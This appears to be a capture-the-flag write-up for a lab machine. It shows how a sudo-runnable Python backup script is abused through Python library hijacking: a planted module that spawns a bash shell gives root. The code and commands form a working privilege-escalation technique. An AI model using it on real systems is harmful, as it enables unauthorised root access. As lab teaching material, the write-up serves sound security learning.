<h1>Privilege Escalation — <code>meliodas</code> → <code>root</code></h1>
<h2>Enumeration with <code>sudo -l</code></h2>
<p>Running <code>sudo -l</code> reveals we can execute <code>/home/meliodas/bak.py</code> as root, even though the file is owned by <code>root</code>.</p>
<p><img src="/img/thm-library-writeup/sudo.png" alt="sudo -l output"></p>
<p>Let's inspect the script:</p>
<pre><code class="hljs language-python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> zipfile

<span class="hljs-keyword">def</span> <span class="hljs-title function_">zipdir</span>(<span class="hljs-params">path, ziph</span>):
    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(path):
        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:
            ziph.write(os.path.join(root, file))

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    zipf = zipfile.ZipFile(<span class="hljs-string">'/var/backups/website.zip'</span>, <span class="hljs-string">'w'</span>, zipfile.ZIP_DEFLATED)
    zipdir(<span class="hljs-string">'/var/www/html'</span>, zipf)
    zipf.close()
</code></pre>
<p>The script itself isn't vulnerable to direct code injection. However, it imports the <code>os</code> and <code>zipfile</code> modules — which opens the door to <strong>Python Library Hijacking</strong>.</p>
<h2>Python Library Hijacking</h2>
<p>When Python imports a module, it searches directories in a specific order, starting with the <strong>current directory</strong>. If we place a malicious file named after a module in the same directory as the script, Python will import <em>our</em> file instead of the real library.</p>
<p>Reference: <a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">Privilege Escalation via Python Library Hijacking</a></p>
<p><strong>Step 1:</strong> Create a fake <code>os.py</code> in the same directory as <code>bak.py</code>:</p>
<pre><code class="hljs language-python"><span class="hljs-keyword">import</span> pty
pty.spawn(<span class="hljs-string">'/bin/bash'</span>)
</code></pre>
<p><strong>Step 2:</strong> Run the script with sudo:</p>
<pre><code class="hljs language-bash"><span class="hljs-built_in">sudo</span> /usr/bin/python3 /home/meliodas/bak.py
</code></pre>
<p><img src="/img/thm-library-writeup/os.png" alt="Attempting os.py hijack"></p>
<p>The <code>os</code> module hijack didn't work in this case. Let's try the same approach with the <code>zipfile</code> module instead — and this time it succeeds!</p>
<p><img src="/img/thm-library-writeup/root.png" alt="Root shell obtained"></p>
<p>We're root!</p>
